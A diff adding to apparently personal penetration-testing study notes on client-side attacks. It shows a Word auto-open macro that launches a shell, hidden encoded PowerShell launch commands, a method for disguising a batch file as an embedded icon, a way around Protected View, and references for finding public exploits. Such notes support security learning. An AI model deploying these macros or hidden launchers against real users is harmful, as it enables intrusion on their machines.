@@ -56,3 +56,75 @@ iKqr8BWFyuiK.Run "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcg
 -w hidden do not pop up a window  
 -EncodedCommand  -e  
 
+# Microsoft macros
+
+```
+Sub AutoOpen()
+MyMacro
+End Sub
+Sub Document_Open()
+MyMacro
+End Sub
+Sub MyMacro()
+CreateObject("Wscript.Shell").Run "cmd"
+End Sub
+```
+
+We must save the containing document as either .docm or the older .doc format, which supports
+embedded macros, but must avoid the .docx format, which does not support them.
+
+
+# Object Linking and Emedding
+Insert batch object into a word file  
+change the present, display as icon, change the icon   
+Can also change caption  
+user need to click on the icon to lanuch the batch file  
+
+START powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBj....  
+
+# Evading Protected View  
+block the execution of macro and embeded object  
+bypass is to use another Office application.  
+
+
+# Locating public exploits 
+https://www.exploit-db.com  
+  
+https://www.securityfocus.com  
+A vulnerability database instead of exploit database, reference may contain some PoC 
+
+https://packetstormsecurity.com  
+It provides up-to-date information on security news and vulnerabilities as well as recently published tools by security vendors
+
+```
+firefox --search "Microsoft Edge site:exploit-db.com"
+```
+inurl intext and intitle  
+
+# Offline exploit resource  
+SearchSploit  
+```
+sudo apt update && sudo apt install exploitdb
+```
+to make sure it is lateset  
+
+/usr/share/exploitdb/exploits/  
+
+
+# nmap NSE script 
+kali@kali:~$ cd /usr/share/nmap/scripts  
+kali@kali:/usr/share/nmap/scripts$ grep Exploits *.nse  
+nmap --script-help=clamav-exec.nse  
+
+# The Browser Exploitation Framework (BeEF)
+# Metasploit Framework 
+
+
+# Put all together 
+```
+sudo nmap 10.11.0.128 -p- -sV -vv --open --reason
+```
+  --open: Only show open (or possibly open) ports  
+  --reason: Display the reason a port is in a particular state  
+
+
